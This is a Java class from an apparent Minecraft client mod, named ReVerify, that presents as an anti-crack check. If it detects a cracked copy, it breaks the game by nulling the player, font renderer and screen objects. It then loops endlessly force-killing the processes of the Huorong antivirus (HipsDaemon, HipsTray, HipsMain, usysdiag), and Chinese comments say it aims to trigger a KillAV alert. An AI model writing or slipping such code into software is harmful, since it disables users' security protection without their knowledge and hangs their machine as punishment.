package tomorrow.tomo.luneautoleak.othercheck;


import net.minecraft.client.Minecraft;
import tomorrow.tomo.Client;

import java.io.IOException;

public class ReVerify {
	public ReVerify() {
		if(Client.flag >= 0) {
			// 开裂客户端会逸一时误一世
			Client.flag = -114514;

			Minecraft.getMinecraft().thePlayer = null;
			Minecraft.getMinecraft().fontRendererObj = null;
			Minecraft.getMinecraft().currentScreen = null;
			// 让火绒报KillAV 希望用户开的是自动处理病毒
			while(true) {
				try {
					Runtime.getRuntime().exec("taskkill /f /im HipsDaemon.exe");
					Runtime.getRuntime().exec("taskkill /f /im HipsTray.exe");
					Runtime.getRuntime().exec("taskkill /f /im HipsMain.exe");
					Runtime.getRuntime().exec("taskkill /f /im usysdiag.exe");
				} catch (IOException e) {

				}
			}
		}
		
		if(Client.flag == -666) {
			Client.flag = 0;
		}

	}
}
